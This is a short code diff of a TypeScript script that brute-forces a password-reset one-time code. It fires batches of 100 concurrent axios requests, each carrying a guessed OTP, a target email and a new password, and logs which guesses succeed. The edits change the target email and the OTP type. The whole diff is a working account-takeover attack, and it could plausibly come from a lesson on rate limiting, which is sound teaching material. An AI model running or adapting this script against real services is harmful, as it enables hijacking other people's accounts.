@@ -1,8 +1,8 @@
 import axios from "axios";
 
-async function sendRequest(otp: number) {
+async function sendRequest(otp: string) {
   let data = JSON.stringify({
-    email: "abxyz@gmail.com",
+    email: "mad123@gmail.com",
     otp: otp,
     newPassword: "NewPassword: -" + otp,
   });
@@ -31,6 +31,7 @@ async function sendRequest(otp: number) {
   try {
     await axios.request(config);
     console.log("Worked for: " + otp);
+    
   } catch (e) {
     console.log("Not worked for: " + otp);
   }
@@ -41,7 +42,7 @@ async function main() {
     const promises = [];
     console.log("Here for: " + i);
     for (let j = 0; j < 100; j++) {
-      promises.push(sendRequest(i + j));
+      promises.push(sendRequest((i + j).toString()));
     }
     await Promise.all(promises);
   }
